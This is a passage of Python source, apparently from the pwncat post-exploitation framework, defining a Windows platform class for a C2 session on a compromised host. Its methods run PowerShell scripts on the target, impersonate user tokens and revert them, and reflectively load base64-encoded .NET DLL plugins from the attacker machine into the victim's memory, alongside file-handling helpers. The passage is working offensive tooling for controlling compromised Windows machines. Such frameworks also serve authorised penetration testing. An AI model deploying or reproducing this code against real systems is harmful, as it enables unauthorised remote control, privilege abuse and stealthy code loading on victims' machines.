        path = self.Path(
            self.powershell("$_ = [System.IO.Path]::GetTempPath() ; $_")[0]
        )
        name = ""

        while True:
            name = f"tmp{pwncat.util.random_string(length=length)}{suffix}"
            try:
                self.new_item(ItemType="File", Path=str(path / name))
                break
            except FileExistsError:
                continue

        return (path / name).open(mode=mode)

    def touch(self, path: str):
        """Touch a file (aka update timestamps and possibly create).

        :param path: path to new or existing file
        :type path: str
        """

        try:
            self.powershell(f'echo $null >> "{path}"')
        except PowershellError as exc:
            if "part of the path" in str(exc).lower():
                raise FileNotFoundError(path)
            raise PermissionError(path)

    def umask(self, mask: Optional[int] = None):
        """Set or retrieve the current umask value"""

        raise NotImplementedError("windows platform does not support umask")

    def unlink(self, path: str):
        """Remove an entry from the file system.

        :param path: path to a file or empty directory
        :type path: str
        """

        # This is a bad solution, but powershell is stupid
        try:
            if self.Path(path).is_dir() and len(self.listdir(path)) != 0:
                raise FileNotFoundError(path)
        except NotADirectoryError:
            pass

        try:
            command = f'Remove-Item -Force -Confirm:$false -Path "{path}"'
            self.powershell(command)
        except PowershellError as exc:
            if "not exist" in str(exc) or "empty" in str(exc):
                raise FileNotFoundError(path)
            raise PermissionError(path)

    def whoami(self) -> str:
        """Retrieve the current user name

        NOTE: This is not cached.
        """

        try:
            result = self.powershell("whoami")[0]
            return result
        except PowershellError as exc:
            raise OSError from exc

    def is_admin(self) -> bool:
        """
        Determine if our current user is an administrator user
        """

        return self._is_admin

    def is_system(self) -> bool:
        """
        Determine if our current user is SYSTEM
        We might not need this, because the users name SHOULD be system...
        but we implement it just in face
        """

        return self._is_system

    def powershell(self, script: Union[str, BinaryIO], depth: int = 1):
        """Execute a powershell script in the context of the C2. The results
        of the command are automatically serialized with ``ConvertTo-Json``.
        You can control the depth of serialization, although with large objects
        this may impose significant performance impacts. The default depth
        is ``1``.

        :param script: a powershell script to execute on the target
        :type script: Union[str, BinaryIO]
        :param depth: the depth of serialization within the returned object, defaults to ``1``
        :type depth: int
        """

        if not isinstance(script, str):
            script = script.read()
        if isinstance(script, bytes):
            script = script.decode("utf-8")

        try:
            result = self.run_method("PowerShell", "run", script, depth)
        except ProtocolError as exc:
            raise PowershellError(exc.message)

        return [json.loads(x) for x in result["output"]]

    def impersonate(self, token: int):
        """Impersonate a user token in the powershell and .net contexts.

        :param token: the user token to impersonate
        :type token: int
        """

        try:
            return self.run_method("Identity", "Impersonate", token)
        except ProtocolError:
            return False

    def revert_to_self(self):
        """Revert any impersonations and return to the original user"""

        return self.impersonate(0)

    def dotnet_load(
        self, name: str, content: Optional[Union[bytes, BytesIO]] = None
    ) -> DotNetPlugin:
        """
        Reflectively load a .Net C2 plugin from the attacker machine. The
        plugin DLL should implement the ``Plugin`` class and method interface.
        The name argument can either be a path to a local DLL or the name of a
        DLL provided by a built-in plugin. Built-in plugins will be automatically
        downloaded if not present in the directory pointed to by the ``plugin_path``
        configuration.

        Plugins are also deduplicated prior to loading on the victim. If a given
        DLL name or a file with a matching hash has already been loaded, the existing
        plugin object is returned, and the DLL is not loaded again.

        The return :class:`DotNetPlugin` class is capable of cleanly translating method
        calls to the methods within the loaded DLL. For example, if ``plugin.dll`` defined
        a method named ``foo``, which took a single string argument, you could call it with:

        .. code-block:: python

            plugin = session.platform.dotnet_load("./plugin.dll")
            result = plugin.foo("Hello World!")

        Plugins can take as parameters and return any JSON-serializable objects.

        :param name: name or path to the DLL to upload
        :type name: str
        :param content: content of the DLL to load or file-like object, if not present on disk
        :type content: Optional[Union[bytes, BytesIO]]
        :rtype: DotNetPlugin
        """

        try:
            plugin = [plugin for plugin in self.plugins if name in plugin.names][0]
            return plugin
        except IndexError:
            pass

        if content is None:
            with Windows.open_plugin(self.manager, name) as filp:
                content = filp.read()

        if not isinstance(content, bytes):
            content = content.read()

        # Calculate the digest
        checksum = hashlib.md5(content).hexdigest()

        # Ensure we haven't loaded the same plugin under another name
        try:
            plugin = [plugin for plugin in self.plugins if plugin.checksum == checksum][
                0
            ]
            plugin.names.append(name)
            return plugin
        except IndexError:
            pass

        # Encode the assembly
        assembly = base64.b64encode(content).decode("utf-8")

        # Load the assembly. Let protocol errors propogate
        ident = self.run_method("Reflection", "load", assembly)

        plugin = DotNetPlugin(self, name, checksum, ident)
        self.plugins.append(plugin)

        return plugin
